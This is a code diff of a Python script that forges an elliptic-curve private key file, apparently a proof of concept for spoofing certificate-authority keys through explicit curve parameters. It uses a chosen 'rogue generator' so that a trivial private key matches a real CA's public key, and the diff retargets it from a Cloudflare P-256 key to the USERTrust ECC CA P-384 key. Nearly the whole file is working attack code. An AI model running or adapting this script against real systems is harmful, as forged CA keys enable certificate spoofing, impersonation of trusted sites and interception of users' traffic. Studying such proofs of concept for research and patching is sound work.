@@ -1,23 +1,23 @@
-from fastecdsa.curve import P256
+from fastecdsa.curve import P384
 from fastecdsa.point import Point
 from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString
 from binascii import unhexlify, hexlify
 import gmpy2
 from Crypto.IO import PEM
 
-# Cloudflare public key
-pubkey = b"d156f49cb6e431a0f5a452cfe39a7a86fff286b25eccb559cc11c74edd64fd559c60e3a04bd97854ff4850baa2e1a158758fc7603744164d5599eceed4337a23"
-Q = Point(int(pubkey[0:64],16), int(pubkey[64:],16), curve=P256)
+# USERTrust ECC Certification Authority public key
+pubkey = b"1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221b3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979"
+Q = Point(int(pubkey[0:96],16), int(pubkey[96:],16), curve=P384)
 
 # Generate rogue generator
 privkey_inv = 2
-privkey = gmpy2.invert(privkey_inv,P256.q)
+privkey = gmpy2.invert(privkey_inv,P384.q)
 privkey = unhexlify(f'{privkey:x}'.encode())
 rogueG = privkey_inv * Q
 rogueG = unhexlify(b"04" + f'{rogueG.x:x}'.encode() + f'{rogueG.y:x}'.encode())
 
 # Generate the file with explicit parameters
-f = open('p256-key.pem','rt')
+f = open('p384-key.pem','rt')
 keyfile = PEM.decode(f.read())
 #print(hexlify(keyfile[0]))
 f.close()
@@ -29,23 +29,23 @@ octet_der = DerOctetString(privkey)
 der[1] = octet_der.encode()
 
 # Replace public key
-print(hexlify(der[3]))
+#print(hexlify(der[3]))
 bits_der = DerBitString(unhexlify(b"04" + pubkey))
-der[3] = b"\xa1\x44" + bits_der.encode()
-print(hexlify(der[3]))
+der[3] = b"\xa1\x64" + bits_der.encode()
+#print(hexlify(der[3]))
 
 # Replace the generator
 #print(hexlify(der[2]))
 seq_der = DerSequence()
-s = seq_der.decode(der[2][3:])
+s = seq_der.decode(der[2][4:])
 octet_der = DerOctetString(rogueG)
 s[3] = octet_der.encode()
-der[2] = der[2][:3] + s.encode()
+der[2] = der[2][:4] + s.encode()
 #print(hexlify(der[2]))
 
 # Generate new file
-f = open('p256-key-rogue.pem','w')
-print(hexlify(der.encode()))
+f = open('p384-key-rogue.pem','w')
+#print(hexlify(der.encode()))
 keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
 f.write(keyfile)
 f.close()
